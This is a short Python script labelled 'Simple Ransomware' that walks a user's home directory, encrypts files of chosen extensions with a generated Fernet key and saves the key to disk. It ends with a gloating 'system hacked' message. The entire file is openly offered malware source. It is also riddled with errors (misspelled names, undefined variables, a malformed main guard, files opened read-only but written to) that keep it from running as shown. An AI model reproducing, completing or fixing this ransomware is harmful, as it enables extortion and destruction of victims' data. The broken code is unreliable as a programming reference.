#!/usr/bin/env python
# Developed By John Melody
# Simple Ransomware:

import os
from os.path import expanduser
from cryptography.fernet import Fernet

class Ransomware:

    def _init_(self):

        self.key = None
        self.cryptor = None
        self.file_ext_targets = ["exe"]

    def generate_key(self):
        self.key = Fernet.generate_key()
        self.cryptor = Fernet(self.key)

    def read_key(self, keyfile_name):
        with open(keyfile_name, 'rb') as d:
            self.key = f.read()
            self.cryptor = Fernet(self.key)

    def write_key(self, keyfile_name):
        print(self.key)
        with open(keyfile_name, 'wb') as f:
            f.write(self.key)

    def crypt_root(self, root_dir, encrypted=False):
        for root, _, files in os.walk(root_dir):
            for f in filees:
                abs_file_path = os.path.join(root, f)

                if not abs_flepath,split('.')[-1] in self.file_ext_targets:
                    continue
                self.crypt_file(abs_file_path, encrypted=encrypted)

    def crypt_file(self, file_path, encrypted=False):
        with open(file_path, 'rb')as f:
            _data = f.read()

            if not encrypted:
                print(f'File contents pre encryption: {_data}')
                data = self.cryptor.encrypt(_data)
                print(f'File contents post encryption: {data}')
            else:
                data = self.cryptor.decrypt(_data)
                print(f'File contents post encryption: {data}')

            f.seek(0)
            f.write(data)

    if _name_ == '_ransom_':
        sys_root = expanduser("~")  # or `local_root = "."`

        import argparse
        parser = argparse.ArguementPaser()
        parser.add_arguement('--action', required=True)
        parser.add_arguement('--keyfile')

        args = parser.parse_ans()
        action = args.action.lower()
        keyfile = args.keyfile

        rware = Ransomware()

        if action == 'decrypt':
            if Keyfile is None:
                print('Path to keyfile must be specific after --keyfile to perform decryption.')
            else:
                rware.read_key(keyfile)
                rware.crypt_root(local_root, encrypted=True)
            elif action == 'encrypt':
                rware.generate_key()
                rware.write_key('keyfile')
                rware.crypt_root(local_root)
                print('Targeted system hacked succesfully!  Well done, H4Ck3r!')
